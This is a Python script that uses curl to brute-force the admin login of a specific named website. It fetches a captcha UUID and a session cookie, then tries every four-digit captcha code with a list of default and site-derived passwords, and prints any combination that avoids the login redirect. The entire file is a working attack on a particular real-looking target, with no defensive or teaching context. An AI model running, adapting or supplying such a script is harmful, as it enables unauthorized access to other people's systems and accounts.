import subprocess, json, sys, time

# Get captcha UUID
r = subprocess.run(["curl","-sk","https://api.myxypt.com/captcha?width=140&height=48"],
    capture_output=True, text=True, timeout=10)
d = json.loads(r.stdout)
UUID = d["data"]["uuid"]
print("UUID:", UUID)

# Get session
subprocess.run(["curl","-sk","-c","/tmp/chin_session.txt",
    "http://chinanaisi.com/admin/login","-o","/dev/null"], timeout=10)

# Passwords  
passwords = ["admin123","admin","admin888","123456","password","chinanaisi",
             "chinanaisi123","12345678","admin666","naisi","naisi123",
             "hongguanjixie","hgkxjx"]

found = False
for i in range(10000):
    code = "%04d" % i
    for pw in passwords:
        try:
            r = subprocess.run(["curl","-sk","--connect-timeout","3","--max-time","5",
                "-b","/tmp/chin_session.txt",
                "http://chinanaisi.com/admin/login.php","-X","POST",
                "-d","action=loginpost&uuid=%s&loginId=&username=admin&password=%s&checkcode=%s" % (UUID, pw, code),
                "-H","X-Requested-With: XMLHttpRequest",
                "-A","Mozilla/5.0","-D","-","-o","/dev/null"],
                capture_output=True, text=True, timeout=7)
        except:
            continue
        
        loc = [l for l in r.stdout.split("\n") if "Location:" in l]
        if not loc or "/admin/login.php" not in str(loc):
            print(">>> HIT: admin/%s code=%s <<<" % (pw, code))
            found = True
            break
    if found:
        break
    if i % 200 == 0:
        print("Progress: %s/10000" % code)

if not found:
    print("All 10000 codes tried, no match")
